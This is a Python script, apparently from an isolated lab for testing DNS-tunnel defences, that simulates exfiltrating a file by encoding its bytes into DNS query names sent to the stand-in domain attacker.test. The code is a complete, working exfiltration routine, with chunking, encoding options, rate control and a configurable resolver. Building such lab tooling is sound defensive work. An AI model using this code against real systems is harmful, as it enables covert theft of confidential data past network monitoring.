"""SIMULATED DNS TUNNEL (for the isolated lab only).
Pretends to steal a file by hiding its bytes inside DNS query names.
Run it inside the victim container:
    docker compose exec victim python src/tunnel_attack.py
Options:  --rate 15   --enc base32|hex|base64   --domain attacker.test   --type TXT"""
import argparse
import os
import time
from dnslib import DNSRecord
from traffic_gen import encode_chunk

p = argparse.ArgumentParser()
p.add_argument("--rate", type=float, default=15, help="queries per second")
p.add_argument("--enc", default="base32", choices=["base32", "hex", "base64"])
p.add_argument("--domain", default="attacker.test")
p.add_argument("--type", default="TXT")
p.add_argument("--chunk", type=int, default=30, help="bytes of secret per query")
p.add_argument("--file", default=os.path.join(os.environ.get("DATA_DIR", "/data"), "secret.txt"))
a = p.parse_args()

RESOLVER = os.environ.get("RESOLVER_IP", "172.28.0.2")
PORT = int(os.environ.get("DNS_PORT", 53))

if not os.path.exists(a.file):   # make a fake secret if none exists
    with open(a.file, "w") as f:
        f.write("CONFIDENTIAL: employee_id,salary,password\n" * 400)
secret = open(a.file, "rb").read()
chunks = [secret[i:i + a.chunk] for i in range(0, len(secret), a.chunk)]
print(f"[attack] exfiltrating {len(secret)} bytes in {len(chunks)} DNS queries "
      f"({a.rate}/s, {a.enc}, {a.type}) to {a.domain}", flush=True)

sent = failed_in_row = 0
start = time.time()
for seq, chunk in enumerate(chunks):
    label = f"{seq:04x}" + encode_chunk(chunk, a.enc, 60)[:50]
    qname = f"{label[:60]}.{a.domain}"
    try:
        data = DNSRecord.question(qname, a.type).send(RESOLVER, PORT, timeout=0.5)
        ok = DNSRecord.parse(data).header.rcode != 5
    except Exception:
        ok = False
    if ok:
        sent += 1
        failed_in_row = 0
    else:
        failed_in_row += 1
        if failed_in_row == 1:
            print(f"[attack] query {seq} FAILED (blocked?)", flush=True)
    if failed_in_row >= 25:
        print(f"[attack] CHANNEL DISRUPTED after {sent} successful queries "
              f"({sent * a.chunk} bytes of {len(secret)} leaked). Attack gives up.", flush=True)
        break
    if seq % 50 == 0:
        print(f"[attack] sent {seq}/{len(chunks)} ({time.time() - start:.0f}s)", flush=True)
    time.sleep(1.0 / a.rate)
else:
    print("[attack] finished: whole file exfiltrated (defence did not stop it!)", flush=True)
